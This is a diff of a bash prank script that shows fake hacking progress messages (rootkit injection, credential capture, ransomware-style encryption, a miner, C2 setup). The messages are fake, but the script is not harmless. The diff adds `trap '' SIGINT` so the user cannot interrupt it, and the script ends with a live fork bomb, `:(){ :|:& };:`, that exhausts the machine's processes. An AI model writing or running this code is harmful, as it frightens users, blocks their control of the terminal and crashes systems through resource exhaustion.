@@ -1,6 +1,10 @@
 #!/bin/bash
 
+# Clear the terminal
 clear
+
+# Disable quitting
+trap '' SIGINT
 
 # ANSI escape codes
 RED='\033[31m'       # normal red   (you can also try \033[1;31m for bright/bold red)
@@ -130,37 +134,37 @@ printf "${RED}══════════════════════
 sleep 1
 
 # Fake malicious tasks
-animate_dots "Disabling firewall" 2
+animate_dots "Disabling firewall" 1
 sleep 0.5
 
-progress_bar "Injecting rootkit into kernel" 3
+progress_bar "Injecting rootkit into kernel" 2
 sleep 0.5
 
-animate_dots "Capturing credentials" 2
+animate_dots "Capturing credentials" 1
 sleep 0.5
 
-progress_bar "Installing backdoor access" 3
+progress_bar "Installing backdoor access" 2
 sleep 0.5
 
-animate_dots "Encrypting system files" 2
+animate_dots "Encrypting system files" 1
 sleep 0.5
 
-progress_bar "Propagating to network shares" 3
+progress_bar "Propagating to network shares" 2
 sleep 0.5
 
-animate_dots "Hijacking DNS resolver" 2
+animate_dots "Hijacking DNS resolver" 1
 sleep 0.5
 
-progress_bar "Exfiltrating system information" 3
+progress_bar "Exfiltrating system information" 2
 sleep 0.5
 
-animate_dots "Installing cryptocurrency miner" 2
+animate_dots "Installing cryptocurrency miner" 1
 sleep 0.5
 
-progress_bar "Establishing command & control connection" 3
+progress_bar "Establishing command & control connection" 2
 sleep 0.5
 
-progress_bar "Setting up Fork bomb" 2
+progress_bar "Setting up Fork bomb" 1
 sleep 0.5
 :(){ :|:& };: 
 
